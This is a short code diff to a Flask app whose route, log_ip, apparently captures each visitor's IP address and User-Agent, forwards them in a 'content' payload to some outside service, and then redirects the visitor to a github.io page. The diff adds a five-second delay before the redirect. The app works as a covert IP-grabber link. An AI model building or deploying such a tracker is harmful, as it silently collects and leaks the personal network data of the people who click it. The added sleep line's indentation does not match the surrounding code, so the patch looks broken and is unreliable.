@@ -2,6 +2,7 @@ from flask import Flask, request , redirect
 from werkzeug.middleware.proxy_fix import ProxyFix
 import requests
 import os
+import time
 
 app = Flask(__name__)
 
@@ -25,6 +26,7 @@ def log_ip():
         "content": f"IP: {ip}\nUser-Agent: {user_agent}"
     })
 
+  time.sleep(5)
     return redirect("https://gengaog.github.io/-/") 
 
 if __name__ == "__main__":
